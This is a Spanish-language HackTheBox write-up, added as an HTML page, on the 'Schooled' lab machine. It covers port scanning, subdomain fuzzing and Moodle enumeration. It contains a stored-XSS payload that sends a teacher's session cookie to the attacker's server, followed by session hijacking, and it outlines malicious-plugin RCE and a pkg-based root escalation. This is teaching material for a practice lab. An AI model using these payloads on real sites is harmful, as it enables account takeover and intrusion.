@@ -1,0 +1,1596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Schooled</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Schooled | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Schooled" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos los permisos que tenemos en el sistema con pkg install para instalar paquetes algo peligrosos." />
+<meta property="og:description" content="Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos los permisos que tenemos en el sistema con pkg install para instalar paquetes algo peligrosos." />
+<link rel="canonical" href="http://localhost:4000/htb/schooled" />
+<meta property="og:url" content="http://localhost:4000/htb/schooled" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-09-11T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" />
+<meta property="twitter:title" content="HackTheBox - Schooled" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-09-11T00:00:00-07:00","datePublished":"2021-09-11T00:00:00-07:00","description":"Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos los permisos que tenemos en el sistema con pkg install para instalar paquetes algo peligrosos.","headline":"HackTheBox - Schooled","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/schooled"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/schooled"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Schooled</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-09-11">11 Sep 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina <strong>FreeBSD</strong> nivel medio, linda locura, nos moveremos mucho por <strong>Moodle</strong> robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos los permisos que tenemos en el sistema con <strong>pkg install</strong> para instalar paquetes algo peligrosos.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335schooledHTB.png" alt="335schooledHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/114053">TheCyberGeek</a>.</p>
+
+<p>Jugaremos con <strong>fuzzing de subdominios</strong> para encontrar un servicio <code>moodle</code> el cual esta infestado de problemas :P</p>
+
+<p>Nos aprovecharemos de un profesor que esta validando si tenemos una característica en nuestro perfil de estudiante para robarle su <strong>cookie de sesión</strong> y convertirnos en él. Estando dentro del <strong>Moodle</strong> como profesores, tendremos algunos <code>CVEs</code> que justamente explotan acciones como ellos.</p>
+
+<p>Tendremos uno en el que podremos aprovechar una mala configuración, modificaremos el rol de nuestro usuario para permitirle a otro usuario convertirse en <strong>manager</strong> de un curso, con esto lograremos que el usuario con rol de <strong>manager</strong> por default (<strong>Lianne</strong>) instale <u>plugins</u> mediante un archivo <code>.zip</code> malicioso. Finalmente lograremos <strong>RCE</strong> como el usuario <code>www</code>.</p>
+
+<p>Adentro encontraremos archivos de configuración, entre ellos la conf de la base de datos, nos apoyaremos de <code>myslqshow</code> y <code>mysqldump</code> para ver el contenido de una tabla con usuarios, uno de ellos conocido en el sistema. Tendremos contraseñas cifradas, apoyándonos de <code>John The Ripper</code> lograremos crackerlas y hacer uso de una de ellas para obtener una Shell como el usuario <code>jamie</code> en el sistema.</p>
+
+<p>Enumerando los permisos que tenemos con <strong>jamie</strong>, veremos que puede actualizar e instalar paquetes en el sistema usando <code>pkg install</code>. Aprovecharemos esto para que mientras se esta instalando un paquete, nosotros podamos inyectar comandos en ese mismo paquete. Así estaríamos ejecutando las instrucciones como el usuario <code>root</code>. Obtendremos una Shell como él modificando el binario <code>/bin/bash</code> dándole permisos <code>SUID</code>.</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Bastante bastante real, vulns conocidas y bastante investigación.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun día se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Camino de verdades y verdaderas mentiras.</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con <strong>nmap</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Recorremos el puerto 80 pa ver que hay por ahí</a>.</li>
+      <li><a href="#web-moodle">Encontramos el servicio <strong>Moodle</strong> corriendo en el servidor web</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#teacher-cookie-hijacking">Jugamos con un mensaje de un profesor y robamos cositas (con respeto)</a>.</li>
+      <li><a href="#CVE-2020-14321">Divagando y explotando la versión del <strong>Moodle</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#movimiento-lateral-jamie">Movimiento Lateral <strong>MySQL</strong>: <strong>www</strong> -&gt; <strong>jamie</strong></a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Vemos que puertos están abiertos con <u>nmap</u> <a href="#enum-nmap">📌</a></h2>
+
+<p>Empezamos haciendo un escaneo de puertos, así sabemos que servicios esta corriendo la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.234 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Sun Apr 11 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.234
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.234 ()   Status: Up
+Host: 10.10.10.234 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 33060/open/tcp//mysqlx///
+# Nmap done at Sun Apr 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 216.96 seconds
+</code></pre>
+
+<p>Perfecto, nos encontramos los servicios:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Contamos con la posibilidad de obtener una Shell de manera segura.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://www.techtarget.com/searchnetworking/definition/port-80">HTTP</a></strong>: Tenemos una página web.</td>
+    </tr>
+    <tr>
+      <td>33060</td>
+      <td style="text-align: left"><strong><a href="https://serverfault.com/questions/1031235/what-is-the-port-33060-for-mysql-server-ports-in-addition-to-the-port-3306#answer-1031240">MySQLx</a></strong>.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora hagamos un escaneo de scripts y versiones para tener info más especifica de cada puerto:</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,80,33060 -sC -sV 10.10.10.234 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+# Nmap 7.80 scan initiated Sun Apr 11 25:25:25 2021 as: nmap -p 22,80,33060 -sC -sV -oN portScan 10.10.10.234
+Nmap scan report for 10.10.10.234
+Host is up (0.19s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
+33060/tcp open  mysqlx?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.80%I=7%D=4/11%Time=60731B26%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,9,"...");
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+ 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Apr 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 78.15 seconds
+</code></pre>
+
+<p>Obtenemos (varias cositas que veremos después) por ahora:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 7.9 (FreeBSD 2020/02/14)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.46 (FreeBSD)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">33060</td>
+      <td style="text-align: left">MySQLx</td>
+      <td style="text-align: left">-</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora exploremos cada servicio a ver por donde podemos vulnerar el sistema.</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Dando vueltas con el puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80.png" alt="335page80" /></p>
+
+<p>Nos encontramos una página web de una institución para estudiar online, dándole una vuelta nos encontramos un email y también alusión al dominio <code>schooled.htb</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_footer.png" alt="335page80_footer" /></p>
+
+<p>Listo, guardemos el email por si algo y agreguemos ese dominio al archivo <code>/etc/hosts</code> para que cuando hagamos peticiones hacia el dominio <strong>schooled.htb</strong> nos resuelva hacia la IP <strong>10.10.10.234</strong>, que quizás tenga info diferente…</p>
+
+<ul>
+  <li><a href="https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html">Info archivo <strong>/etc/hosts</strong></a>.</li>
+</ul>
+
+<hr />
+
+<pre><code class="language-bash">❭ cat /etc/hosts
+...
+10.10.10.234  schooled.htb
+...
+</code></pre>
+
+<p>Y validando de nuevo en la web, pero en vez de escribir la IP ahora escribimos el dominio y obtenemos aparentemente el mismo resultado que antes.</p>
+
+<p>Enumerando nos encontramos el apartado <code>/teachers.html</code> el cual tiene algunos nombres y roles que podemos guardar por si llegamos a encontrar algún portal o algo que podamos relacionar:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_teachers.png" alt="335page80_teachers" /></p>
+
+<pre><code class="language-bash">Jane Higgins -&gt; Scientific.
+Lianne Carter -&gt; Manager &amp; Profesora.
+Manuel Phillips -&gt; Profesor.
+Jamie Borham -&gt; Profesora.
+</code></pre>
+
+<p>Siguiendo, en el apartado <code>/contact.html</code> encontramos unos campos a llenar y al enviarlos nos redirecciona a un archivo llamado <code>contact.php</code>, pero obtenemos un error con estado <strong>404 Not Found</strong>…</p>
+
+<hr />
+
+<h2 id="web-moodle">Encontramos el servicio <u>Moodle</u> <a href="#web-moodle">📌</a></h2>
+
+<p>Acá no encontramos nada más en la web, jugando con el código fuente o con las carpetas que hay no vemos nada, así que procedamos a fuzzear un poco…</p>
+
+<p>Haciendo un fuzzing de archivos y directorio no encontramos nada, pero si fuzzeamos a ver si existe otro dominio relacionado con <code>schooled.htb</code> el cual responda a la IP <strong>10.10.10.234</strong> tenemos:</p>
+
+<pre><code class="language-bash">❭ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.10.234 -H 'Host: FUZZ.schooled.htb'
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload      
+=====================================================================
+
+000000022:   200        461 L    1555 W     20750 Ch    "pop3"
+000000001:   200        461 L    1555 W     20750 Ch    "www"
+000000003:   200        461 L    1555 W     20750 Ch    "ftp"
+000000007:   200        461 L    1555 W     20750 Ch    "webdisk"
+000000015:   200        461 L    1555 W     20750 Ch    "ns"
+000000023:   200        461 L    1555 W     20750 Ch    "forum"
+...
+</code></pre>
+
+<p>Tenemos muchos, pero probablemente sean falsos positivos, así que filtremos para que nos quite todos los que tengan como numero total de letras <strong>1555</strong>:</p>
+
+<pre><code class="language-bash">❭ wfuzz -c --hc=404 --hw=1555 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.10.234 -H 'Host: FUZZ.schooled.htb'
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000162:   200        1 L      5 W        84 Ch       "moodle"
+</code></pre>
+
+<p>Perfecto, aparentemente tenemos un nuevo dominio a probar, pues agreguémoslo junto a <strong>schooled.htb</strong> al archivo <code>/etc/hosts</code>:</p>
+
+<pre><code class="language-bash">❭ cat /etc/hosts
+...
+10.10.10.234  schooled.htb moodle.schooled.htb
+...
+</code></pre>
+
+<p>Y validando en la web nos encontramos con:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle.png" alt="335page80_moodle" /></p>
+
+<p>Nice, tenemos un servicio <code>moodle</code>, que según <a href="https://es.wikipedia.org/wiki/Moodle">Wikipedia</a> es:</p>
+
+<p>🎓 <strong><em>Herramienta de gestión de aprendizaje (LMS), o más concretamente de <u>Learning Content Management</u> (LCMS), de distribución libre, escrita en PHP.</em></strong></p>
+
+<ul>
+  <li><a href="https://moodle.org/?lang=es">Web Oficial de Moodle</a>.</li>
+</ul>
+
+<p>Si intentamos ver cualquier recurso nos pide un ingreso por medio de credenciales… (Probar contraseñas por default y con los profesores encontrados no nos dio resultado).</p>
+
+<p>Pero también podemos ingresar como invitado o crearnos una cuenta, probando inicialmente el acceso como invitado contra cualquier curso nos pide que debemos tener una cuenta:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_mathEnrol.png" alt="335page80_moodle_mathEnrol" /></p>
+
+<p>Dando vueltas por el sitio como invitado vemos varias URL’s posiblemente llamativas:</p>
+
+<ul>
+  <li>
+    <p><code>http://moodle.schooled.htb/moodle/enrol/index.php?id=5</code></p>
+
+    <p>El <strong>ID</strong> va del <strong>5</strong> al <strong>2</strong>, el número <strong>1</strong> nos redirecciona a la página principal donde están todos los cursos.</p>
+  </li>
+  <li>
+    <p><code>http://moodle.schooled.htb/moodle/calendar/view.php?view=month</code></p>
+
+    <p>Tiene la opción de variar entre <strong>día</strong>, <strong>mes</strong> y <strong>año</strong>, pero solo <strong>mes</strong> (month) funciona.</p>
+  </li>
+  <li>
+    <p><code>http://moodle.schooled.htb/moodle/calendar/view.php?view=month&amp;time=1614556800</code></p>
+
+    <p>Podemos ver el calendario de varios meses, ya que <strong>time</strong> depende del mes que escojamos.</p>
+  </li>
+</ul>
+
+<p>Entonces, con esto en mente podríamos probar <strong>inyección SQL</strong> (no va por acá) de varias maneras, validando rápidamente que no existan más IDs (cursos) tenemos:</p>
+
+<pre><code class="language-bash">❭ for id in $(seq 0 20); do echo -n "ID: $id -&gt; Status Code: "; curl -s -I --cookie "MoodleSession=2a9js25d3usf0dv3u5r27c21nn" http://moodle.schooled.htb/moodle/enrol/index.php?id=$id | grep "HTTP/1.1" | awk '{print $2}'; done
+
+ID: 0 -&gt; Status Code: 404
+ID: 1 -&gt; Status Code: 303
+ID: 2 -&gt; Status Code: 200
+ID: 3 -&gt; Status Code: 200
+ID: 4 -&gt; Status Code: 200
+ID: 5 -&gt; Status Code: 200
+ID: 6 -&gt; Status Code: 404
+ID: 7 -&gt; Status Code: 404
+ID: 8 -&gt; Status Code: 404
+ID: 9 -&gt; Status Code: 404
+ID: 10 -&gt; Status Code: 404
+ID: 11 -&gt; Status Code: 404
+ID: 12 -&gt; Status Code: 404
+ID: 13 -&gt; Status Code: 404
+ID: 14 -&gt; Status Code: 404
+ID: 15 -&gt; Status Code: 404
+ID: 16 -&gt; Status Code: 404
+ID: 17 -&gt; Status Code: 404
+ID: 18 -&gt; Status Code: 404
+ID: 19 -&gt; Status Code: 404
+ID: 20 -&gt; Status Code: 404
+</code></pre>
+
+<p>Ahora probando a registrarnos encontramos un nuevo dominio:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleSignup.png" alt="335page80_moodleSignup" /></p>
+
+<ul>
+  <li><code>student.schooled.htb</code>.</li>
+</ul>
+
+<p>Pero agregándolo al archivo <code>/etc/hosts</code> y validando su contenido nos damos cuenta de que responde con el mismo de <code>schooled.htb</code>. Así que cambiamos nuestro email con ese dominio y nos permite registrarnos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleDash.png" alt="335page80_moodleDash" /></p>
+
+<p>Vemos algo interesante a la izquierda, <strong>Private files</strong>, echándole un ojo nos permite subir archivos, podemos hacerlo mediante un URL:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodlePrivFiles.png" alt="335page80_moodlePrivFiles" /></p>
+
+<p>Probando a que el servicio lea un archivo que esté alojado en nuestra máquina (servidor) obtenemos respuesta, pero después de varios intentos no logramos nada relevante. Dando vueltas encontramos que podemos modificar nuestra imagen de perfil. Intentamos lo mismo que antes e incluso subir una imagen con metadatos <code>PHP</code> o cambiándole los magic bytes a un script para que el sistema crea que es un <code>JPEG</code>, pero nada, no obtenemos respuesta.</p>
+
+<ul>
+  <li><a href="https://lanzt.github.io/blog/htb/HackTheBox-Magic"><strong>INFO metadata y cambiar magic bytes</strong>. (En la mitad del post esta)</a>.</li>
+</ul>
+
+<p>Entrando en <strong>Site home</strong> nos damos cuenta de algo interesante, el curso <strong>Mathematics</strong> es el único al cual podemos “anotarnos” como estudiantes:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleMathEnrol.png" alt="335page80_moodleMathEnrol" /></p>
+
+<p>Después de anotarnos (enrolarnos) nos redirige a:</p>
+
+<pre><code class="language-bash">http://moodle.schooled.htb/moodle/course/view.php?id=5
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleMathView.png" alt="335page80_moodleMathView" /></p>
+
+<p>Si nos movemos a <strong>Annoucements</strong> tenemos 2 mensajes:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleMathAnnoun.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Fijándonos en el primero tenemos información interesante:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleMathAnn_reminder.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="teacher-cookie-hijacking">Jugamos con la interacción del profesor para robarle su cookie <a href="#teacher-cookie-hijacking">📌</a></h2>
+
+<p>👨‍🏫 <strong><em>Students who do not set their <u>MoodleNet profiles</u> will be removed from the course before the course is due to start and <u>I will be checking all students who are enrolled on this course</u></em></strong>.</p>
+
+<p>Nos indica que el usuario <strong>Manuel Phillips</strong> (profesor) estará revisando que todos los estudiantes que se unan a su curso tengan habilitado o modificado en su perfil (estudiante) algo llamado <strong>MoodleNet</strong> (que es una red social para educadores según la <a href="https://moodle.com/es/moodlenet/">web oficial</a>) :O</p>
+
+<p>Opa, esto esta interesante, ya que dependiendo el campo el cual debamos modificar podríamos pensar en robarle la <code>cookie</code> al profesor, ya que estaría verificando nuestro perfil (<strong>siempre y cuando estemos enrolados en su curso</strong>), por lo tanto esta entrando en el campo (de nuestro perfil) y validaría su contenido.</p>
+
+<p>Veamos, vamos a nuestro perfil arriba a la derecha, damos clic en <strong>edit profile</strong> y vemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleProfile_mooNet.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Es un campo de texto, pues vayamos a la fija e intentemos que lea algo de nuestro servidor a ver si realmente el profesor esta validando el input:</p>
+
+<p>Levantamos servidor web:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Y en el campo <strong>MoodleNet</strong> escribimos:</p>
+
+<pre><code class="language-js">&lt;script src="http://10.10.14.11:8000/serompe.oque"&gt;&lt;/script&gt;
+</code></pre>
+
+<p>Guardamos los cambios… Y si revisamos nuestro servidor:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.234 - - [12/Apr/2021 25:25:25] code 404, message File not found
+10.10.10.234 - - [12/Apr/2021 25:25:25] "GET /serompe.oque HTTP/1.1" 404 -
+</code></pre>
+
+<p>Entonces, esta perfecto, sabemos que el profesor esta validando ese campo, ahora podemos proceder a robarle su cookie, para esto simplemente indicamos en el campo <code>MoodleNet</code>:</p>
+
+<pre><code class="language-js">&lt;script&gt;document.write('&lt;img src="http://10.10.14.11:8000/serompe.oque?cookie=' + document.cookie + '"&gt;')&lt;/script&gt;
+</code></pre>
+
+<p>Esto va a intentar subir una imagen (como antes), solo que como la imagen “esta” en nuestro servidor, intentara cargarla, peeeero además le concatenamos una variable llamada <code>cookie</code> que guardara la sesión del usuario que ingrese al campo (con <code>document.cookie</code>), o sea, obtendríamos la cookie del profesor que esta validando el campo.</p>
+
+<p>Guardamos yyyyyyyyyy en nuestro servidor obtenemos:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.234 - - [12/Apr/2021 25:25:25] code 404, message File not found
+10.10.10.234 - - [12/Apr/2021 25:25:25] "GET /serompe.oque?cookie=MoodleSession=boejsdgppi3r50rahsn0tcnqji HTTP/1.1" 404 -
+</code></pre>
+
+<p>PERFECTOOOOOOOOOOOO, tenemos la petición con una cookie, pues probemos a cambiar la nuestra por esa:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_changeCookie.png" alt="335page80_moodle_changeCookie" /></p>
+
+<p>VAMONOOOOOOOOOOOOOOOOOOS, somos el usuario <code>Manuel Phillips</code>.</p>
+
+<p>En su perfil vemos un correo y un dominio, podemos guardarlos por si algo. Además sabemos la estructura de como están (suponemos) guardados los usuarios (o profesores) del servidor: <code>apellido_nombre@dominio</code>.</p>
+
+<hr />
+
+<h2 id="CVE-2020-14321">Divagando y explotando la versión de <u>Moodle</u> <a href="#CVE-2020-14321">📌</a></h2>
+
+<p>Viendo que podemos hacer ahora como profesor, leyendo cositas y probando otras, finalmente en la web encontramos un PoC haciendo alusión al CVE <a href="https://moodle.org/mod/forum/discuss.php?d=407393">CVE-2020-14321</a> que se ve interesante:</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=BkEInFI4oIU">Youtube - Moodle RCE <strong>CVE-2020-14321</strong> POC</a>.</li>
+</ul>
+
+<hr />
+
